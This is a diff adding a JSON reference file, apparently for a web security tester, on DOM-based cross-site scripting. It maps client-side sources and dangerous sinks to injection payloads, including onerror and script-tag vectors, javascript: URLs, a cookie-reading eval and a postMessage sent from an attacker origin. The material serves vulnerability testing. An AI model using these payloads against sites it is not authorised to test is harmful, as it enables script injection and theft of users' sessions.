@@ -1,0 +1,83 @@
+{
+  "type": "xss_dom",
+  "description": "DOM-based XSS: payload flows from a source to a sink entirely client-side, never touching the server.",
+  "approach": [
+    "1. Identify DOM sources: location.hash, location.search, location.pathname, document.referrer, window.name, postMessage",
+    "2. Trace flow in JS to DOM sinks",
+    "3. Inject payload via the source"
+  ],
+  "sources": {
+    "location_hash": {
+      "description": "Input from URL fragment (#)",
+      "test_url": "https://target.com/page#<script>alert(1)</script>",
+      "payloads": [
+        "#<img src=x onerror=alert(1)>",
+        "#javascript:alert(1)",
+        "#'-alert(1)-'"
+      ]
+    },
+    "location_search": {
+      "description": "Input from query string (?param=)",
+      "payloads": [
+        "?param=<script>alert(1)</script>",
+        "?param=\"><img src=x onerror=alert(1)>",
+        "?param=javascript:alert(1)"
+      ]
+    },
+    "document_referrer": {
+      "description": "Input from HTTP Referrer header read via document.referrer",
+      "approach": "Set Referer header to payload, or embed target in page with malicious link"
+    },
+    "window_name": {
+      "description": "Input from window.name (persists across same-origin navigations)",
+      "payloads": ["<img src=x onerror=alert(1)>"],
+      "attack": "Open target in new window: window.open(url); then set target.name = payload"
+    },
+    "postMessage": {
+      "description": "Unsanitized postMessage listener",
+      "approach": "Send crafted postMessage from attacker.com: window.postMessage('<img src=x onerror=alert(1)>', '*')"
+    }
+  },
+  "sinks": {
+    "innerHTML": {
+      "dangerous": true,
+      "payloads": ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]
+    },
+    "outerHTML": {
+      "dangerous": true,
+      "payloads": ["<img src=x onerror=alert(1)>"]
+    },
+    "document_write": {
+      "dangerous": true,
+      "payloads": ["<script>alert(1)</script>"]
+    },
+    "eval": {
+      "dangerous": true,
+      "payloads": ["alert(1)", "alert(document.cookie)"]
+    },
+    "setTimeout_setInterval": {
+      "dangerous": true,
+      "payloads": ["alert(1)", "eval('alert(1)')"]
+    },
+    "location_href": {
+      "dangerous": true,
+      "payloads": ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]
+    },
+    "src_attribute": {
+      "dangerous": true,
+      "payloads": ["javascript:alert(1)"]
+    },
+    "jQuery_html": {
+      "dangerous": true,
+      "payloads": ["<img src=x onerror=alert(1)>"],
+      "note": "$().html(), $().append(), $().prepend(), $().before(), $().after()"
+    }
+  },
+  "testing_approach": [
+    "1. Review JS files for dangerous sink patterns (innerHTML, eval, document.write)",
+    "2. Trace backward from sink to find what variable is written to it",
+    "3. Trace forward from each source to find what reaches a sink",
+    "4. Craft payload based on source type and sink context",
+    "5. Test in Playwright — DOM XSS never leaves a server-side trace"
+  ]
+}
